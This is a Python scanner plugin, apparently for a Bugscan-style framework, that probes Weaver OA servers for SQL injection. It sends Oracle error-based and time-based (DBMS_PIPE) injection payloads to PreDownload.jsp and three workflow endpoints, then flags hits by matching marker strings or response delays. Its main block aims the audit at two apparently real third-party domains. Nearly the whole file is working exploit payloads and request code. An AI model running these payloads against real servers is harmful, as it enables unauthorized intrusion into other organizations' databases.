#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0138725
#refer:http://www.wooyun.org/bugs/wooyun-2015-0140003
import time

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):
    url = arg + 'mobile/plugin/PreDownload.jsp?url=1'
    payload = '%27%20AND%207528%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287528%3D7528%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%271%27%3D%271'
    code, head,res, errcode, _ = curl.curl2(url+payload)
    if code ==200 and 'qzpxq1qbpxq' in res :
        security_hole(url + "   :sql Injection")
    else:
        payload1 = '%27%20AND%201%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2871%29%7C%7CCHR%28103%29%7C%7CCHR%28119%29%2C5%29%20AND%20%271%27%3D%271'
        payload2  = payload1.replace('5','0')
        t1 = time.time()
        code1, head, res1, errcode, _ = curl.curl2(url+payload1)
        t2 = time.time()
        code2, head, res2, errcode, _ = curl.curl2(url+payload2)
        t3 = time.time()
        if code1==200 and code2 == 200 and (2*t2 - t1 - t3 > 3):
            security_hole(url + "   :sql Injection")
        
    payloads = [
        'mobile/plugin/loadWfGraph.jsp?workflowid=1&requestid=1',
        'ServiceAction/com.eweaver.workflow.subprocess.servlet.SubprocessAction?action=getlist&nodeid=1',
        'ServiceAction/com.eweaver.workflow.workflow.servlet.WorkflowinfoAction?action=getreqxml&workflowid=1&id=2'
        
        ]
    getdata = '%27%20AND%209830%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2899%29%7C%7CCHR%28113%29%7C%7CCHR%28116%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283708%3D3708%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28109%29%7C%7CCHR%28122%29%7C%7CCHR%28111%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%271%27%3D%271'
    for payload in payloads:
        url = arg + payload + getdata
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 200 and 'qcqtq1qmzoq' in res :
            security_hole(arg + payload + "   :sql Injection")
        
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa','http://oa.ad-mart.cn/')[1])
    audit(assign('weaver_oa','http://mail.weifu.com.cn/')[1])